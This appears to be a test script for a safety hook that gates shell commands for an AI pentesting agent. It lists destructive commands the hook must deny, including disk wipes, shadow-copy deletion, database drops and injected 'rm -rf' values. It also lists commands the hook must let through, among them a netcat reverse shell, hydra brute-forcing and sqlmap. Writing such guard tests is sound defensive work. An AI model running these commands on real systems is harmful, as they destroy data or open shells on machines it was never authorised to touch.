from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
HOOK = ROOT / ".claude" / "hooks" / "safety_gate.py"


# Must be DENIED: irreversible destruction / mass exfil / DoS / money — never
# needed to PROVE a vulnerability.
BLOCKED_COMMANDS = [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /etc",
    "rm -rf '/'",
    # destructive rm SHIPPED TO A TARGET (rm co-located with a URL) — blocked at
    # any path, because destroying target data/files is never a proof step:
    "curl 'http://t.test/?c=rm -rf /app/data'",
    "python tools/probe.py POST http://t.test/x --data 'ip=1;rm -rf /opt/app'",
    "mysql -e 'DROP DATABASE prod'",
    "mysql -e 'DROP TABLE users'",
    # harm-as-purpose / secure-wipe destruction (never auto):
    "vssadmin delete shadows /all /quiet",
    "wbadmin delete catalog -quiet",
    "shred -u -z secret.key",
    "wipefs -a /dev/sda",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    "az group delete --name rg-prod --yes",
    "mysqldump -u root app_db > dump.sql",
    "redis-cli FLUSHALL",
    "mongosh --eval 'db.users.drop()'",
    "curl 'https://t.test/?q=1;DROP TABLE users--'",
    "curl -X DELETE https://example.test/api/item/1",
    "masscan 10.0.0.0/8",
    "terraform destroy -auto-approve",
    "kubectl delete pod web-0",
    "docker rm -f app",
    "aws s3 rb s3://my-bucket --force",
    "gcloud compute instances delete vm-1",
]

# Must be ALLOWED (hook stays silent). This is the false-positive guard: running
# a verification command, uploading a file (esp. a harmless one), creating data,
# or sending an injection-differential probe is NOT destruction and must never be
# blocked. If a new deny rule trips one of these, the rule is too broad.
ALLOWED_COMMANDS = [
    # repo-relative cleanup must pass through to the native ask/allow flow — the
    # rm rule is narrowed to catastrophic targets, so local housekeeping is not
    # hard-denied (the operator's normal-use guard).
    "rm -rf tmp/build",
    "rm -f runs/dvwa_20260613/evidence/cookies.txt",
    "rm -rf node_modules",
    "Get-ChildItem -Force",
    "python tools/check_rules.py",
    "nc -e /bin/sh 10.0.0.1 4444",
    "hydra -l user -P passwords.txt example.test http-post-form",
    "curl -F file=@proof.php https://t.test/upload",
    "curl -X POST https://t.test/api/users -d 'name=test'",
    "curl -s 'https://t.test/items?id=1 AND 1=1'",
    "sqlmap -u https://t.test/?id=1 --batch --technique=BEU --banner",
    "python tools/probe.py https://t.test/ -X POST --data user=a",
    "curl -X PUT https://t.test/api/profile -d 'bio=hi'",
    "aws s3 cp ./proof.txt s3://b/proof.txt",
    "kubectl get pods",
    "docker ps -a",
    "id",
    # permission / privilege changes are SOFT rules now (operator-gated in the
    # skill), so the hook stays silent on them:
    "chmod -R 777 target_dir",
    "aws iam attach-user-policy --user-name x --policy-arn y",
]


def run_hook(command: str) -> tuple[int, str, str]:
    event = {"tool_input": {"command": command}}
    completed = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(event),
        text=True,
        capture_output=True,
        check=False,
    )
    return completed.returncode, completed.stdout.strip(), completed.stderr.strip()


def is_denied(stdout: str) -> bool:
    if not stdout:
        return False
    try:
        data = json.loads(stdout)
    except json.JSONDecodeError:
        return False
    output = data.get("hookSpecificOutput") or {}
    return output.get("permissionDecision") == "deny"


def main() -> int:
    if not HOOK.exists():
        print(f"missing hook: {HOOK}")
        return 1

    failures: list[str] = []
    for command in BLOCKED_COMMANDS:
        _, stdout, stderr = run_hook(command)
        if stderr or not is_denied(stdout):
            failures.append(f"expected deny for: {command}")

    for command in ALLOWED_COMMANDS:
        _, stdout, stderr = run_hook(command)
        if stderr or stdout:
            failures.append(f"expected silence for: {command}")

    if failures:
        print("hook check failed")
        for failure in failures:
            print(f"- {failure}")
        return 1

    print("hook check passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
